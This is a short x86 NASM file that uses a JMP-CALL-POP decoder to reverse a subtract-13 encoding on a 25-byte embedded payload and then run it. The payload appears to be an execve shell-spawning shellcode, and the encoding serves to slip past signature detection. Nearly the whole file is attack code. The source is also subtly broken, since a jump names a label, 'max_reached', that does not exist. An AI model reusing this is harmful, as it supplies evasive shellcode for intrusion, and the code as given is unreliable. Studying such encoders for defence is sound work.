# Filename: decoder.nasm
# Author: Gal Nagli
global _start
section .text
_start:
	jmp short call_shellcode
decoder:
	pop esi ; pop the address of the shellcode in the ESI register
	xor ecx, ecx ; zeroing out the ECX register
	mov cl, 25 ; counter = 25 (length of the shellcode, number of loops)
	
decode:
	cmp byte [esi], 0xD ; compare if it's possible to substract the value 13 from the byte
	jl max_reached ; jump if less -> full_reached
	sub byte [esi], 0xD ; substract the value 13
	jmp short shellcode
	
full_reached:
	xor edx, edx ; zeroing out the EDX register
	mov dl, 0xD ; set the value 13 into the EDX register
	sub dl, byte [esi] ; subtract 13 - byte value of the shellcode
	xor ebx, ebx ; zeroing out the EBX register
	mov bl, 0xff ; 0xff = 255 (making it two-staged to not encounter null-byte)
	inc ebx ; = 256
	sub bx, dx ; 256 - (13 - byte value of the shellcode)
	mov byte [esi], bl ; move bl into the ESI register
	
shellcode:
	inc esi ; move to the next byte
	loop decode ; loop "decode"
	jmp short EncodedShellcode
	
call_shellcode:
	call decoder
	EncodedShellcode: db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b,0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d
